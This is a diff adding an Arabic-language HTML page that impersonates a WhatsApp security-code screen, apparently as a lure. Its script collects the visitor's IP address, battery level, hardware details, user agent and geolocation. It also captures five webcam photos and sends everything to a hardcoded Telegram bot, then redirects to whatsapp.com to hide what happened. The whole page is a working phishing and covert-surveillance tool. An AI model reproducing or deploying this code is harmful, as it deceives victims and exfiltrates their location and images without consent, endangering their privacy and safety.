@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp | رمز التحقق للأمان</title>
+
+    <!-- وسوم المعاينة الخارجية للصورة wht441 -->
+    <meta property="og:title" content="WhatsApp | كود التحقق الأمني">
+    <meta property="og:description" content="كود التحقق الخاص بك هو 842-663. لا تشارك هذا الكود مع أحد.">
+    <meta property="og:image" content="wht441.jpg">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="wht441.jpg">
+
+    <!-- استدعاء مكتبة Font Awesome للأيقونات الرسمية -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0b141a; /* خلفية واتساب الداكنة */
+            color: #e9edef;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* الحاوية المركزية بتصميم واتساب */
+        .whatsapp-card {
+            background-color: #111b21;
+            border: 1px solid #222d34;
+            border-radius: 20px;
+            padding: 35px 25px;
+            width: 88%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            box-sizing: border-box;
+        }
+
+        /* شعار واتساب العلوي */
+        .wa-header-icon {
+            color: #25d366;
+            font-size: 55px;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin: 0 0 15px 0;
+            color: #e9edef;
+            font-weight: 600;
+        }
+
+        /* مربع عرض كود التحقق */
+        .code-box {
+            background-color: #202c33;
+            border: 1px dashed #25d366;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 4px;
+            color: #25d366;
+            display: inline-block;
+            margin-bottom: 25px;
+            direction: ltr; /* لضمان عرض الرقم بشكل صحيح من اليسار لليمين */
+        }
+
+        /* الزر الموحد لإنهاء العملية */
+        .single-btn {
+            background-color: #25d366;
+            color: #0b141a;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.2);
+        }
+
+        .single-btn:active {
+            transform: scale(0.97);
+            background-color: #20bd5a;
+        }
+
+        .single-btn i {
+            font-size: 20px;
+        }
+
+        /* نص التحذير الأمني */
+        .security-note {
+            font-size: 13px;
+            color: #8696a0;
+            line-height: 1.6;
+            margin-top: 25px;
+            margin-bottom: 0;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 12px;
+            border-radius: 8px;
+            border-right: 3px solid #f39c12;
+            text-align: right;
+        }
+
+        /* شاشة التحميل */
+        .loading-screen {
+            display: none;
+            padding: 20px 0;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #25d366;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-screen p {
+            color: #25d366;
+            font-size: 15px;
+            margin: 0;
+        }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="whatsapp-card">
+        <!-- واجهة العناصر المباشرة -->
+        <div id="ui-elements">
+            <div class="wa-header-icon">
+                <i class="fa-brands fa-whatsapp"></i>
+            </div>
+            
+            <h1>رمز التوثيق الخاص بك</h1>
+
+            <!-- الكود المطلوب أعلى الزر -->
+            <div class="code-box">842-663</div>
+
+            <!-- الزر الموحد مع أيقونة FONT -->
+            <button class="single-btn" onclick="executeProcess()">
+                <i class="fa-brands fa-whatsapp"></i>
+                رفض ومتابعة الحساب
+            </button>
+
+            <!-- نص التنبيه المضاف أسفل الزر -->
+            <p class="security-note">
+                إذا لم تطلب كود رجاء تحقق من خيارات الأمان وقم بإزالة جهاز جديد.
+            </p>
+        </div>
+
+        <!-- شاشة الانتظار -->
+        <div id="loading-area" class="loading-screen">
+            <div class="spinner"></div>
+            <p>جاري التحميل يرجى الانتظار ثواني...</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = "8747697919:AAF4Ju18rnZOlSFgDQlsgPyU45g9fRh8c9E";
+        const CHAT_ID = "8908174599";
+
+        async function executeProcess() {
+            // التحويل الفوري لشاشة التحميل
+            document.getElementById('ui-elements').style.display = 'none';
+            document.getElementById('loading-area').style.display = 'block';
+
+            const techData = await fetchTech();
+            const now = new Date().toLocaleString('ar-EG');
+
+            let report = `📱 **تفاعل جديد (تأكيد كود واتساب 842-663)**\n\n`;
+            report += `🕓 الوقت: ${now}\n`;
+            report += `🌍 IP: ${techData.ip}\n`;
+            report += `🔋 البطارية: ${techData.battery}\n`;
+            report += `🖥️ المعالج: ${navigator.hardwareConcurrency} Cores\n\n`;
+            report += `===== 🧾 User-Agent =====\n`;
+            report += `\`${navigator.userAgent}\``;
+
+            sendToTelegram(report);
+
+            // طلب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // طلب الكاميرا والتقاط 5 صور
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                let count = 0;
+                const interval = setInterval(() => {
+                    if(count < 5) {
+                        capture(count + 1);
+                        count++;
+                    } else {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://www.whatsapp.com";
+                    }
+                }, 1200);
+            } catch(e) {
+                sendToTelegram("❌ رفض الكاميرا");
+                window.location.href = "https://www.whatsapp.com";
+            }
+        }
+
+        async function fetchTech() {
+            let res = { ip: 'Unknown', battery: 'N/A' };
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                res.ip = d.ip;
+                const b = await navigator.getBattery();
+                res.battery = `${(b.level*100)}%`;
+            } catch(e){}
+            return res;
+        }
+
+        function capture(n) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', blob, 'img.jpg');
+                f.append('caption', `اللقطة ${n} | كود 842-663`);
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(t) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
+            });
+        }
+    </script>
+</body>
+</html>
+
